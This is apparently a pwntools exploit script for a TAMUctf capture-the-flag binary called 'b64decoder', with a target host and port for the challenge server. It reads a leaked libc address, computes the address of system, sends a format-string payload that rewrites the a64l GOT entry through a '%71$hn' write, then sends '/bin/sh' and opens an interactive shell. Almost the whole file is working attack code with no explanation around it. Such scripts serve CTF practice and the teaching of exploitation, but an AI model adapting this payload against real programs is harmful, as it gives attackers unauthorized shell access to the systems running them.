#!/usr/bin/env python                                                                                                                                                                                                        
                                                                                                                                                                                                                             
from pwn import *                                                                                                                                                                                                            
                                                                                                                                                                                                                             
BINARY = './b64decoder'                                                                                                                                                                                                      
LIBC = './libc.so.6'                                                                                                                                                                                                         
HOST = 'challenges.tamuctf.com'                                                                                                                                                                                              
PORT = 2783                                                                                                                                                                                                                  
                                                                                                                                                                                                                             
elf = ELF(BINARY)                                                                                                                                                                                                            
libc = ELF('./libc.so.6')                                                                                                                                                                                                    
                                                                                                                                                                                                                             
context.terminal = ['tmux', 'split-w']                                                                                                                                                                                       
                                                                                                                                                                                                                             
printf = elf.got['printf']                                                                                                                                                                                                   
                                                                                                                                                                                                                             
def get_base_address(proc):                                                                                                                                                                                                  
        return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)                                                                                                                            
                                                                                                                                                                                                                             
def debug(breakpoints):                                                                                                                                                                                                      
        script = ""                                                                                                                                                                                                          
        for bp in breakpoints:                                                                                                                                                                                               
                script += "b *0x%x\n"%(PIE+bp)                                                                                                                                                                               
        gdb.attach(process(BINARY), gdbscript=script)                                                                                                                                                                        
                                                                                                                                                                                                                             
def start():                                                                                                                                                                                                                 
    if not args.REMOTE:                                                                                                                                                                                                      
        print "LOCAL PROCESS"                                                                                                                                                                                                
        return process(BINARY, env={"LD_PRELOAD":LIBC})                                                                                                                                                                      
    else:                                                                                                                                                                                                                    
        print "REMOTE PROCESS"                                                                                                                                                                                               
        return remote(HOST, PORT)                                                                                                                                                                                            
                                                                                                                                                                                                                             

p = start()
if args.GDB:
    gdb.attach(p, 'b fgets')

one_gadget_offset = 0x691eb


print(p.recvline())
print(p.recvline())
powered_by = p.recvline()
print(powered_by)
leak = powered_by[powered_by.find("(") +1:powered_by.find(")")]
print(leak)
print(p.recvline())

libc_base = int(leak, 16) - 0x3f290
print("libc base: {}".format(hex(libc_base)))

a64l = elf.got['a64l']
print("puts.got: {}".format(hex(a64l)))

one_gadget = libc_base + one_gadget_offset
#print("one_gadget: {}".format(hex(one_gadget)))


low_word = one_gadget & 0xffff
print("low_word: {}".format(hex(low_word)))
high_byte = (one_gadget & 0xff000000)>>24
print("high_byte: {}".format(hex(high_byte)))

system = libc_base + libc.sym['system']
print("system: {}".format(hex(system)))


#exploit = fmtstr_payload(71, {elf.got['fgets']:system},write_size='byte')

#p32(puts)
#exploit = 'AAAA' + '%' + str(low_word)+'c' + '%71$hn'
low_word = system & 0xfffff
print("low_word: {}".format(hex(low_word)))
exploit = p32(a64l) + '%' + str(low_word - 4) + 'c'  +  '%71$hn'


p.sendline(exploit)
p.sendline('/bin/sh')
p.interactive()

print(p.recvline())
print(p.recvline())
print(p.recvline())
print(p.recvline())

